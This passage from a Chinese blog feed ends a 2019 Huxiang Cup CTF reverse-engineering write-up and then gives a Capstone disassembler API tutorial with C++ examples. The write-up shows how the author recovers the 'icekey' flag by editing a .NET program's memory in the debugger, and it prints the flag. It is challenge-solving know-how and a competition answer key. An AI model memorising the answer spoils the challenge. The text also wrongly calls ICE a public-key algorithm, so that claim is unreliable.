data-src="https://i.loli.net/2019/11/12/jCDMgiAa3sIJwP8.png" class="lazyload"></a></p><p>#FFRFFF####ZZRZZZ##FF#FFFF</p><h2 id="icekey"><a href="#icekey" class="headerlink" title="icekey"></a>icekey</h2><p>.NET程序，直接上dnSpy</p><p>定位到关键函数位置<br><a href="https://i.loli.net/2019/11/12/pfuCB8hsnV7D643.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2019/11/12/pfuCB8hsnV7D643.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2019/11/12/giOozl1pJQ5sryc.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2019/11/12/giOozl1pJQ5sryc.png" class="lazyload"></a></p><p>关键算法如下<br><a href="https://i.loli.net/2019/11/12/LSAUMI9lTvhPoNd.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2019/11/12/LSAUMI9lTvhPoNd.png" class="lazyload"></a></p><p>使用了IceKey公钥算法<br><a href="https://upload.wikimedia.org/wikipedia/commons/d/df/ICE_%28cipher%29_InfoBox_Diagram.png" data-fancybox="group" data-caption="Ice" class="fancybox"><img alt="Ice" title="Ice" data-src="https://upload.wikimedia.org/wikipedia/commons/d/df/ICE_%28cipher%29_InfoBox_Diagram.png" class="lazyload"></a></p><p>这里加解密都已经封装好了，key是字符串iriszero的md5值<br>内部加密没有做任何改动，有兴趣可以对比官方实现  <a href="http://www.darkside.com.au/ice/" target="_blank" rel="noopener">http://www.darkside.com.au/ice/</a></p><p>最后加密的密文和<code>string b = &quot;3ACF8D62AAA0B630C4AF43AF327CE129D46F0FEB98D9040F713BE65502A5107A&quot;;</code>比较</p><p>既然下面给了解密流程，那就不好意思了<br>观察到bytes数组存放明文，array数组存放密文，因此只需要动态调试在解密前将array内的值改为b，解密后查看bytes值即可<br>注意：要构造和b/2等长即32位伪flag才能申请到足够的数组长度。</p><p><a href="https://i.loli.net/2019/11/12/4Gki5WQzLHmEand.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/11/12/4Gki5WQzLHmEand.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2019/11/12/zBXVFqnj35vtLdI.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/11/12/zBXVFqnj35vtLdI.png" class="lazyload"></a></p><p>修改完记得右键刷新才能在局部变量中显示</p><p>运行解密函数后查看bytes数组内存如下，即为flag<br><a href="https://i.loli.net/2019/11/12/jZadOwUSgrpvqG5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/11/12/jZadOwUSgrpvqG5.png" class="lazyload"></a></p><p>flag：5acb06231724c8c369bae711166dbe85</p><p>验证一下<br><a href="https://i.loli.net/2019/11/12/yIuPFcG4VoavpHf.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/11/12/yIuPFcG4VoavpHf.png" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;2019湖湘杯线上-RE-WriteUp&quot;&gt;&lt;a href=&quot;#2019湖湘杯线上-RE-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;2019湖湘杯线上 RE WriteUp&quot;&gt;&lt;/a&gt;2019湖湘杯线上 RE</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(四)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E5%9B%9B)/"/>
    <id>https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E5%9B%9B)/</id>
    <published>2019-08-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:39:30.599Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-四"><a href="#Capstone反汇编引擎数据类型及API分析及示例-四" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(四)"></a>Capstone反汇编引擎数据类型及API分析及示例(四)</h1><h2 id="API分析"><a href="#API分析" class="headerlink" title="API分析"></a>API分析</h2><h3 id="cs-free"><a href="#cs-free" class="headerlink" title="cs_free"></a>cs_free</h3><p><code>void CAPSTONE_API cs_free(cs_insn *insn, size_t count);</code></p><p>释放被cs_malloc() 或 cs_disasm()分配的内存(insn参数)<br>参数<br>insn: 由cs_disasm()或cs_malloc()中的@insn参数返回的指针<br>count: 赋值由cs_disasm()返回的cs_insn结构的数量，或赋值为1表示由cs_malloc()分配给空闲内存的数量</p><p>代码实现<br><a href="https://i.loli.net/2019/07/27/5d3bf583b748d86745.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3bf583b748d86745.jpg" class="lazyload"></a><br>直接调用cs_mem_free,也就是默认的free</p><p>示例(释放cs_disasm申请的内存)，代码片段：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);           <span class="comment">//计数由cs_disasm申请的内存</span></span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);   <span class="comment">//循环依次释放每条insn的内存</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="cs-malloc"><a href="#cs-malloc" class="headerlink" title="cs_malloc"></a>cs_malloc</h3><p><code>cs_insn * CAPSTONE_API cs_malloc(csh handle);</code></p><p>被用于在API cs_disasm_iter()中为一条指令分配内存</p><p>参数<br>handle: cs_open()返回的句柄</p><p>代码实现<br><a href="https://i.loli.net/2019/07/27/5d3bf97c0299d21615.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3bf97c0299d21615.jpg" class="lazyload"></a></p><p>当这条指令所占的内存不再使用时，使用cs_free(insn, 1)释放，示例在下面cs_disasm_iter处</p><h3 id="cs-disasm-iter"><a href="#cs-disasm-iter" class="headerlink" title="cs_disasm_iter"></a>cs_disasm_iter</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> CAPSTONE_API <span class="title">cs_disasm_iter</span><span class="params">(csh handle,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">uint8_t</span> **code, <span class="keyword">size_t</span> *size,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">uint64_t</span> *address, cs_insn *insn)</span></span>;</span><br></pre></td></tr></table></figure></div><p>给定buff、大小、地址和要解码的指令数，更快速的反汇编机器码，<br>这个API将生成的指令放入insn中的给定的缓存中。</p><p>注意1: 此API将更新code、size和address以指向输入缓冲区中的下一条指令。所以，虽然每次反汇编一条指令可以使用cs_disasm(count=1)来实现，但一些基准测试显示，在循环中使用cs_disasm_iter()可以方便地快速迭代所有指令，在随机输入时可以快30%。</p><p>注意2:可以使用cs_malloc()创建insn中的缓存。</p><p>注意3:对于动态分配内存可能产生内存不足的系统(比如OS内核或固件)，建议使用cs_disasm()这个API, 因为cs_disasm()是根据要分解的指令的数量来分配内存。</p><p>参数<br>handle: cs_open()返回的句柄<br>code: 要反汇编的机器码所在的缓冲区<br>size: 机器码缓冲区的大小<br>address: 所给机器码缓冲区中第一个insn的地址<br>insn: 指向这个API要填充的指令的指针。<br>return:如果这个API成功反汇编了一条指令返回true，否则将返回false。</p><p>失败时，调用cs_errno()获取错误代码。</p><p>代码实现，在cs_disasm基础上使用动态内存分配</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> CAPSTONE_API <span class="title">cs_disasm_iter</span><span class="params">(csh ud, <span class="keyword">const</span> <span class="keyword">uint8_t</span> **code, <span class="keyword">size_t</span> *size,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">uint64_t</span> *address, cs_insn *insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"><span class="keyword">uint16_t</span> insn_size;</span><br><span class="line">MCInst mci;</span><br><span class="line"><span class="keyword">bool</span> r;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"><span class="keyword">if</span> (!handle) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line">MCInst_Init(&amp;mci);</span><br><span class="line">mci.csh = handle;</span><br><span class="line"></span><br><span class="line">mci.address = *address;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为无detail模式保存相关信息</span></span><br><span class="line">mci.flat_insn = insn;</span><br><span class="line">mci.flat_insn-&gt;address = *address;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line">mci.flat_insn-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">mci.flat_insn-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">r = handle-&gt;disasm(ud, *code, *size, &amp;mci, &amp;insn_size, *address, handle-&gt;getinsn_info);</span><br><span class="line"><span class="keyword">if</span> (r) &#123;</span><br><span class="line">SStream ss;</span><br><span class="line">SStream_Init(&amp;ss);</span><br><span class="line"></span><br><span class="line">mci.flat_insn-&gt;size = insn_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将内部指令操作码映射到公共insn ID</span></span><br><span class="line">handle-&gt;insn_id(handle, insn, mci.Opcode);</span><br><span class="line"></span><br><span class="line">handle-&gt;printer(&amp;mci, &amp;ss, handle-&gt;printer_info);</span><br><span class="line"></span><br><span class="line">fill_insn(handle, insn, ss.buffer, &amp;mci, handle-&gt;post_printer, *code);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调整伪操作码(X86)</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;arch == CS_ARCH_X86)</span><br><span class="line">insn-&gt;id += mci.popcode_adjust;</span><br><span class="line"></span><br><span class="line">*code += insn_size;</span><br><span class="line">*size -= insn_size;</span><br><span class="line">*address += insn_size;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 遇到中断指令</span></span><br><span class="line"><span class="keyword">size_t</span> skipdata_bytes;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果没有跳过数据的请求，或者剩余数据太小，则退出</span></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;skipdata || handle-&gt;skipdata_size &gt; *size)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata_setup.callback) &#123;</span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_setup.callback(*code, *size,</span><br><span class="line"><span class="number">0</span>, handle-&gt;skipdata_setup.user_data);</span><br><span class="line"><span class="keyword">if</span> (skipdata_bytes &gt; *size)</span><br><span class="line"><span class="comment">// 剩余数据太小</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!skipdata_bytes)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基于架构和模式跳过一些数据</span></span><br><span class="line">insn-&gt;id = <span class="number">0</span>;<span class="comment">// 此“数据”指令的ID无效</span></span><br><span class="line">insn-&gt;address = *address;</span><br><span class="line">insn-&gt;size = (<span class="keyword">uint16_t</span>)skipdata_bytes;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line">insn-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">insn-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="built_in">memcpy</span>(insn-&gt;bytes, *code, skipdata_bytes);</span><br><span class="line"><span class="built_in">strncpy</span>(insn-&gt;mnemonic, handle-&gt;skipdata_setup.mnemonic,</span><br><span class="line"><span class="keyword">sizeof</span>(insn-&gt;mnemonic) - <span class="number">1</span>);</span><br><span class="line">skipdata_opstr(insn-&gt;op_str, *code, skipdata_bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">*code += skipdata_bytes;</span><br><span class="line">*size -= skipdata_bytes;</span><br><span class="line">*address += skipdata_bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE16 <span class="meta-string">"\x8d\x4c\x32\x08\x01\xd8\x81\xc6\x34\x12\x00\x00"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x8d\x4c\x32\x08\x01\xd8\x81\xc6\x34\x12\x00\x00"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[4] = &#123;</span>     <span class="comment">//架构及模式</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_16,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE16,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 16bit (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32bit (ATT syntax)"</span>,</span><br><span class="line">CS_OPT_SYNTAX,</span><br><span class="line">CS_OPT_SYNTAX_ATT,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为cs_disasm_iter()分配内存</span></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);   <span class="comment">//原机器码</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;   <span class="comment">//cs_disasm_iter反汇编</span></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s // insn-ID: %u, insn-mnem: %s\n"</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str,</span><br><span class="line">insn-&gt;id, cs_insn_name(handle, insn-&gt;id));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印此指令使用的隐式寄存器</span></span><br><span class="line">detail = insn-&gt;detail;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (detail-&gt;regs_read_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tImplicit registers read: "</span>);</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; detail-&gt;regs_read_count; n++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, cs_reg_name(handle, detail-&gt;regs_read[n]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印此指令修改的隐式寄存器</span></span><br><span class="line"><span class="keyword">if</span> (detail-&gt;regs_write_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tImplicit registers modified: "</span>);</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; detail-&gt;regs_write_count; n++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, cs_reg_name(handle, detail-&gt;regs_write[n]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印此指令所属指令集</span></span><br><span class="line"><span class="keyword">if</span> (detail-&gt;groups_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tThis instruction belongs to groups: "</span>);</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; detail-&gt;groups_count; n++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, cs_group_name(handle, detail-&gt;groups[n]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放cs_malloc()分配的内存</span></span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出<br><a href="https://i.loli.net/2019/07/27/5d3c063cd33b421225.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c063cd33b421225.jpg" class="lazyload"></a></p><h3 id="cs-reg-name"><a href="#cs-reg-name" class="headerlink" title="cs_reg_name"></a>cs_reg_name</h3><p><code>const char * CAPSTONE_API cs_reg_name(csh handle, unsigned int reg_id);</code></p><p>获取寄存器的名字(string类型)<br>寄存器id可在相关架构的头文件(建立项目时复制到项目文件夹的那些头文件)内找到</p><p>注意： 当处于diet模式时此API不可用，因为引擎不会存储寄存器名</p><p>参数<br>handle: cs_open()返回的句柄<br>reg_id: 寄存器id<br>return: 寄存器的字符名, 如果reg_id不可用返回NULL</p><p>代码实现<br><a href="https://i.loli.net/2019/07/27/5d3c0dcfa15c265034.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c0dcfa15c265034.jpg" class="lazyload"></a></p><p>示例(打印RAX)：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, cs_reg_name(handle, X86_REG_RAX));</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出<br><a href="https://i.loli.net/2019/07/27/5d3c100276bac46235.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c100276bac46235.jpg" class="lazyload"></a></p><h3 id="cs-insn-name"><a href="#cs-insn-name" class="headerlink" title="cs_insn_name"></a>cs_insn_name</h3><p><code>const char * CAPSTONE_API cs_insn_name(csh handle, unsigned int insn_id);</code></p><p>获取指令的名字(string类型)<br>指令id可在相关架构的头文件(建立项目时复制到项目文件夹的那些头文件)内找到</p><p>注意： 当处于diet模式时此API不可用，因为引擎不会存储寄存器名</p><p>参数<br>handle: cs_open()返回的句柄<br>insn_id: 指令id<br>return: 指令的字符名, 如果insn_id不可用返回NULL</p><p>代码实现<br><a href="https://i.loli.net/2019/07/27/5d3c18c11f4cc51220.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/27/5d3c18c11f4cc51220.jpg" class="lazyload"></a></p><p>示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span 